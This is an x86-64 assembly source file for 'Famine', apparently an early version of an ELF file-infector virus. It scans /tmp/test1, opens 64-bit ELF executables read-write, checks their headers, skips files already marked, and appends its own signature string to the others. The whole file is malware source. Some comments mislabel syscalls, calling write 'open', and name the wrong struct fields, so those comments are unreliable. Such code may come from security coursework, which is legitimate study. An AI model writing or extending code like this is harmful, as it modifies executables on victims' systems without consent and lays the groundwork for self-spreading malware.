section .text
	global _start
	global main
	global handle_file
	global check_binary

	global _memcpy
	global _strlen
	global _strcat
	global _strncmp
	global _malloc
	global _free

d_signature:
	.text db "Famine version 1.0 (c)oded by clanier", 0x0
	.len equ $ - d_signature.text
d_elfmag64:
	.text db 0x7f, 0x45, 0x4c, 0x46, 0x02
d_dir1:
	.text db "/tmp/test1", 0x0

; ----------
; | _START |
; ----------

_start:
	call main
	xor rdi, rdi

exit:
	mov rax, 0x3c		; (exit) syscall
	syscall

; -----------
; | _MEMCPY |
; -----------

_memcpy:
	push rdi
	mov rax, rdi
	mov rcx, rdx
	rep movsb
	pop rdi
	ret

; -----------
; | _STRLEN |
; -----------

_strlen:
	push rdi
	mov al, 0x0
	mov rcx, -1
	cld
	repnz scasb
	mov rax, -2
	sub rax, rcx
	pop rdi
	ret

; -----------
; | _STRCAT |
; -----------

_strcat:
	push rdi
	call _strlen
	push rax
	mov rdi, rsi
	call _strlen
	mov rdx, rax
	mov rsi, rdi
	pop r8
	mov rdi, [rsp]
	add rdi, r8
	mov byte [rdi + rdx], 0x0
	call _memcpy
	pop rax
	ret

; ------------
; | _STRNCMP |
; ------------

_strncmp:
	mov rax, 0x0
	push rdi
	push rsi

strncmp_loop:
	cmp rdx, 0
	jbe strncmp_exit
	mov r8b, byte [rdi]
	cmp r8b, byte [rsi]
	jne strncmp_diff
	test r8b, r8b
	je strncmp_exit
	dec rdx
	inc rdi
	inc rsi
	jmp strncmp_loop

strncmp_diff:
	mov r8b, byte [rdi]
	cmp r8b, byte [rsi]
	jb strncmp_less
	mov rax, 1
	jmp strncmp_exit

strncmp_less:
	mov rax, -1

strncmp_exit:
	pop rsi
	pop rdi
	ret

; -----------
; | _MALLOC |
; -----------

_malloc:
	push rdi
	add rdi, 0x8
	mov rsi, rdi
	xor rdi, rdi
	mov edx, 0x3	; PROT_READ | PROT_WRITE
	mov r10d, 0x22	; MAP_ANON | MAP_PRIVATE
	mov r8d, -1
	xor r9, r9
	mov rax, 0x9	; (mmap) syscall
	syscall
	pop rdi
	cmp rax, -1
	jle malloc_failed
	mov [rax], rdi
	add rax, 0x8
	jmp malloc_exit

malloc_failed:
	mov rax, 0

malloc_exit:
	ret

; ---------
; | _FREE |
; ---------

_free:
	sub rdi, 0x8
	mov rsi, [rdi]
	add rsi, 0x8
	mov rax, 0xb
	syscall
	ret

; -----------------
; | STRUCT T_FILE |
; -----------------

; int size;			0x0
; int fd;			0x4
; void *ptr;		0x8
; Elf64_Phdr *e_hdr	0x10
; Elf64_Shdr *e_hdr	0x18

; sizeof(t_file) => 0x20

; ---------------
; | EDIT_BINARY |
; ---------------

; int edit_binary();

edit_binary:
	mov rsi, [rdi + 0x8]
	xor rdx, rdx
	mov edx, [rdi]
	mov edi, [rdi + 0x4]
	mov rax, 0x1			; (open) syscall
	push rdi
	syscall
	pop rdi
	lea rsi, [rel d_signature.text]
	mov rdx, d_signature.len
	mov rax, 0x1			; (open) syscall
	syscall
	ret

; -------------------
; | CHECK_SIGNATURE |
; -------------------

; int check_signature(t_file *file);

check_signature:
	push rdi
	xor r8, r8
	mov r8d, [rdi]
	add r8, [rdi + 0x8]
	mov rdx, d_signature.len
	sub r8, rdx
	mov rdi, r8
	lea rsi, [rel d_signature.text]
	call _strncmp
	test rax, rax
	je check_signature_fail
	mov rax, 0
	jmp check_signature_exit

check_signature_fail:
	mov rax, -1

check_signature_exit:
	pop rdi
	ret

; ---------------------
; | CHECK_WELL_FORMED |
; ---------------------

; int check_well_formed(t_file *file);

check_well_formed:
	push rbp
	mov rbp, rsp
	sub rsp, 0x10
	mov r8, [rdi + 0x8]
	mov r9, [rdi + 0x10]
	sub r9, r8
	mov rax, 0x38			; sizeof(Elf64_Phdr)
	xor rcx, rcx
	mov cx, [r8 + 0x38]		; e_phnum
	mul rcx
	add rax, r9
	cmp eax, dword [rdi]
	jg check_well_formed_fail
	mov r9, [rdi + 0x18]
	sub r9, r8
	mov rax, 0x40			; sizeof(Elf64_Shdr)
	xor rcx, rcx
	mov cx, [r8 + 0x3c]		; e_shnum
	mul cx
	add rax, r9
	cmp eax, dword [rdi]
	jg check_well_formed_fail
	xor rcx, rcx
	mov cx, [r8 + 0x38]
	mov r9, [rdi + 0x10]

check_phdr:
	test cx, cx
	je check_phdr_end
	mov r10, [r9 + 0x8]		; p_offset
	add r10, [r9 + 0x20]	; + p_filesz
	cmp r10d, dword [rdi]
	jg check_well_formed_fail
	dec cx
	add r9, 0x38
	jmp check_phdr

check_phdr_end:
	mov cx, [r8 + 0x3c]
	mov r9, [rdi + 0x18]

check_shdr:
	test cx, cx
	je check_shdr_end
	mov r10, [r9 + 0x18]	; sh_offset
	add r10, [r9 + 0x20]	; + sh_size
	cmp r10d, dword [rdi]
	jg check_well_formed_fail
	dec cx
	add r9, 0x40
	jmp check_shdr

check_shdr_end:
	xor rax, rax
	jmp check_well_formed_exit

check_well_formed_fail:
	mov rax, -1

check_well_formed_exit:
	leave
	ret

; -------------
; | FILL_FILE |
; -------------

; void fill_file(t_file *file);

fill_file:
	mov r8, [rdi + 0x8]
	mov r9, r8
	mov r10, [r8 + 0x20]
	add r9, r10
	mov [rdi + 0x10], r9	; file->e_hdr = ((Elf64_Ehdr*)(file->ptr))->e_phoff;
	mov r9, r8
	mov r10, [r8 + 0x28]
	add r9, r10
	mov [rdi + 0x18], r9	; file->e_hdr = ((Elf64_Ehdr*)(file->ptr))->e_shoff;
	ret

; ----------------
; | CHECK_BINARY |
; ----------------

; int check_binary(t_file *file);

check_binary:
	push rbp
	mov rbp, rsp
	sub rsp, 0x8
	cmp dword [rdi], 0x40		; minimum sizeof(Elf64_Ehdr) size (64 bytes)
	jb check_binary_fail
	push rdi
	mov rdi, [rdi + 0x8]
	lea rsi, [rel d_elfmag64]
	mov rdx, 0x5
	call _strncmp
	test rax, rax				; ELFMAG
	jne check_binary_fail
	pop rdi
	mov rsi, [rdi + 0x8]
	cmp word [rsi + 0x10], 0x2		; ET_EXEC
	jne check_binary_fail
	xor rax, rax
	jmp check_binary_exit

check_binary_fail:
	mov rax, -1

check_binary_exit:
	leave
	ret

print_file:
	push rbp
	mov rbp, rsp
	sub rsp, 0x10
	mov rsi, [rdi + 0x8]
	xor rdx, rdx
	mov edx, [rdi]
	mov rdi, 0
	mov rax, 0x1
	syscall
	leave
	ret

; ---------------
; | HANDLE_FILE |
; ---------------

; int handle_file(char *dir, char *name);

; rbp - 0x90  => struct stat
; rbp - 0x98  => filename
; rbp - 0x9c  => fd
; rbp - 0x104 => mmap file
; rbp - 0x10c => t_file
; rbp - 0x114 => malloc file
; rbp - 0x108 => file size

handle_file:
	push rbp
	mov rbp, rsp
	sub rsp, 0x118
	mov [rsp + 0x4], rsi
	mov [rsp + 0xc], rdi
	call _strlen
	mov [rsp], eax
	mov rdi, [rsp + 0x4]
	call _strlen
	mov rdi, rax
	add edi, [rsp]
	add rdi, 0x2
	call _malloc						; file = malloc(strlen(dir) + strlen(name) + 2);
	test rax, rax
	je handle_file_exit
	mov rdi, rax
	mov rsi, [rsp + 0xc]
	mov edx, [rsp]
	call _memcpy						; file = memcpy(file, dir, strlen(dir));
	mov byte [rdi + rdx], 0x2f			; file[strlen(dir)] = '/';
	mov byte [rdi + rdx + 0x1], 0x0		; file[strlen(dir)] = '\0';
	mov rsi, [rsp + 0x4]
	call _strcat						; file = strcat(file, name);
	mov [rbp - 0x98], rax
	mov rdi, rax
	mov rsi, 0x2		; O_RDWR
	mov rax, 0x2		; (open) syscall
	syscall
	cmp eax, 0x0
	jl handle_file_free_filename
	mov [rbp - 0x9c], eax
	mov rdi, rax
	lea rsi, [rel rbp - 0x90]
	mov rax, 0x5		; (fstat) syscall
	syscall
	cmp rax, 0x0
	jl handle_file_close
	xor rdi, rdi
	mov esi, [rbp - 0x60]
	mov [rbp - 0x118], esi
	mov edx, 0x1
	mov r10, 0x2
	xor r8, r8
	mov r8b, [rbp - 0x9c]
	xor r9, r9
	mov rax, 0x9		; (mmap) syscall
	syscall
	cmp rax, -1
	jle handle_file_munmap
	mov [rbp - 0x104], rax
	mov rdi, 0x20					; sizeof(struct t_file)
	call _malloc
	test rax, rax
	je handle_file_munmap
	mov [rbp - 0x10c], rax
	mov r8d, [rbp - 0x60]
	mov [rax], r8d					; file->size = buf.st_size;
	mov r8, [rbp - 0x104]
	mov [rax + 0x8], r8				; file->ptr = ptr;
	mov r8d, [rbp - 0x9c]
	mov [rax + 0x4], r8d			; file->ptr = fd;
	mov rdi, rax
	call check_binary
	test rax, rax
	jne handle_file_free_struct
	mov rax, [rbp - 0x10c]
	xor rdi, rdi
	mov edi, [rax]
	call _malloc						; allocate the file
	test rax, rax
	je handle_file_free_struct
	mov [rbp - 0x114], rax
	mov rdi, rax
	mov rax, [rbp - 0x10c]
	mov rsi, [rax + 0x8]
	xor rdx, rdx
	mov edx, [rax]
	call _memcpy						; copy the file in the heap
	mov rdi, [rbp - 0x10c]
	mov [rdi + 0x8], rax
	call fill_file					; set file->*_hdr
	call check_well_formed			; check if the binary is well formed
	test rax, rax
	jne handle_file_free_file
	call check_signature
	test rax, rax
	jne handle_file_free_file
	call edit_binary
	mov rax, 0x0a6f6c6f79
	push rax
	mov byte [rsp + 0x4], 0xa
	mov rdi, 0x1
	mov rsi, rsp
	mov rdx, 0x5
	mov rax, 0x1
	syscall

handle_file_free_file:
	mov rdi, [rbp - 0x114]
	call _free						; free the file

handle_file_free_struct:
	mov rdi, [rbp - 0x10c]
	call _free

handle_file_munmap:
	mov rdi, [rbp - 0x104]
	xor rsi, rsi
	mov esi, [rbp - 0x118]
	mov rax, 0xb			; (munmap) syscall
	syscall

handle_file_close:
	mov rdi, [rbp - 0x9c]
	mov rax, 0x3			; (close) syscall
	syscall

handle_file_free_filename:
	mov rdi, [rbp - 0x98]	; get the filename
	call _free

handle_file_exit:
	leave
	ret

; --------------------
; | HANDLE_DIRECTORY |
; --------------------

; void handle_directory(char *dir)

; rbp - 0x400 => buf[0x400]
; rbp - 0x404 => fd
; rbp - 0x408 => nread
; rbp - 0x410 => dir

handle_directory:
	push rbp
	mov rbp, rsp
	sub rsp, 0x410
	mov [rbp - 0x410], rdi
	mov rsi, 0x10000			; O_RDONLY | O_DIRECTORY
	mov rax, 2					; (open) syscall
	syscall
	cmp eax, -1
	jle handle_directory_exit
	mov [rbp - 0x404], eax

handle_directory_readdir:
	mov edi, [rbp - 0x404]
	lea rsi, [rbp - 0x400]
	mov rdx, 0x400
	mov rax, 0x4e				; (getdents) syscall
	syscall
	cmp eax, -1
	jle handle_directory_close
	test rax, rax
	je handle_directory_close
	mov [rbp - 0x408], eax
	xor rdx, rdx

handle_directory_loop:
	cmp edx, [rbp - 0x408]
	jge handle_directory_endloop
	mov rdi, [rbp - 0x410]
	lea rsi, [rbp - 0x400 + rdx + 0x12]
	push rdx
	call handle_file
	pop rdx
	xor r8w, r8w
	mov r8b, [rbp - 0x400 + rdx + 0x10]
	add dx, r8w
	jmp handle_directory_loop

handle_directory_endloop:
	jmp handle_directory_readdir

handle_directory_close:
	mov edi, [rbp - 0x404]
	mov rax, 0x3				; (close) syscall
	syscall

handle_directory_exit:
	leave
	ret

; --------
; | MAIN |
; --------

main:
	push rbp
	mov rbp, rsp
	sub rsp, 0x10
	lea rdi, [rel d_dir1.text]
	call handle_directory
	leave
	ret
